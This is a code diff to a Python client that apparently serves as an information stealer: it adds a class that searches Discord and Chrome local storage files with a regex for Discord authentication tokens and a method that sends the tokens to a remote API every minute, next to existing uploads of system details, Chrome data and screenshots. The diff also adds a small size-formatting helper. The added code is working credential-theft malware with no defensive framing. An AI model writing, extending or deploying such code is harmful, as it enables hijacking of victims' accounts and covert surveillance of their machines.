@@ -1,4 +1,5 @@
 import os
+import re
 import platform
 import psutil
 from datetime import datetime
@@ -54,6 +55,13 @@ class ApiController():
         else:
             return False
 
+    def get_size(self, bytes, suffix="B"):
+        factor = 1024
+        for unit in ["", "K", "M", "G", "T", "P"]:
+            if bytes < factor:
+                return f"{bytes:.2f}{unit}{suffix}"
+            bytes /= factor
+
     def update_details(self, identifier, token):
         if self.check_connection():
             uname = platform.uname()
@@ -71,7 +79,7 @@ class ApiController():
                 "architecture": uname.machine,
                 "boot_time": f"{bt.year}/{bt.month}/{bt.day} {bt.hour}:{bt.minute}:{bt.second}",
                 "cpu_cores": psutil.cpu_count(logical=True),
-                "memory": psutil.virtual_memory().total
+                "memory": self.get_size(psutil.virtual_memory().total)
             }
 
             requests.post(f"{self.api_url}/update/details/{identifier}", json=post_data)
@@ -88,6 +96,14 @@ class ApiController():
                 }
 
                 requests.post(f"{self.api_url}/update/chrome/{identifier}", json=post_data)
+
+    def update_discord(self, identifier, token, data):
+        if self.check_connection():
+            post_data = {
+                "tokens": data
+            }
+
+            requests.post(f"{self.api_url}/update/discord/{identifier}/{token}", json=post_data)
 
     def update_screenshot(self, identifier, token):
         if self.check_connection():
@@ -174,6 +190,53 @@ class Chrome(object):
             pass
         return self.stored
 
+class Discord():
+    def __init__(self):
+        self.tokens = []
+        self.saved = ""
+        self.regex = r"[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_\-]{27}|mfa\.[a-zA-Z0-9_\-]{84}"
+
+    def discord(self):
+        discordPaths = [
+            os.getenv('APPDATA') + '\\Discord\\Local Storage\\leveldb',
+            os.getenv('APPDATA') + '\\discordcanary\\Local Storage\\leveldb',
+            os.getenv('APPDATA') + '\\discordptb\\Local Storage\\leveldb'
+        ]
+
+        for location in discordPaths:
+            try:
+                if os.path.exists(location):
+                    for file in os.listdir(location):
+                        with open(f"{location}\\{file}", errors='ignore') as _data:
+                            regex = re.findall(self.regex, _data.read())
+                            if regex:
+                                for token in regex:
+                                    self.tokens.append(token)
+            except:
+                pass
+
+    def chrome(self):
+        chromie = os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb'
+        try:
+            if os.path.exists(chromie):
+                for file in os.listdir(chromie):
+                    with open(f"{chromie}\\{file}", errors='ignore') as _data:
+                        regex = re.findall(self.regex, _data.read())
+                        if regex:
+                            for token in regex:
+                                self.tokens.append(token)
+        except Exception as e:
+            pass
+
+    def neatify(self):
+        self.discord()
+        for token in set(self.tokens):
+            self.saved += "TOKEN:%s\n" % token
+
+    def dump(self):
+        self.neatify()
+        return self.saved
+
 def main():
     api = ApiController()
     fsc = FileController()
@@ -195,6 +258,7 @@ def main():
                 if api.check_account(bot_identifier, bot_token):
                     schedule.every(1).minutes.do(api.update_details, bot_identifier, bot_token)
                     schedule.every(1).minutes.do(api.update_chrome, bot_identifier, bot_token, Chrome().dump())
+                    schedule.every(1).minutes.do(api.update_discord, bot_identifier, bot_token, Discord().dump())
                     schedule.every(1).minutes.do(api.update_screenshot, bot_identifier, bot_token)
 
                     while True:
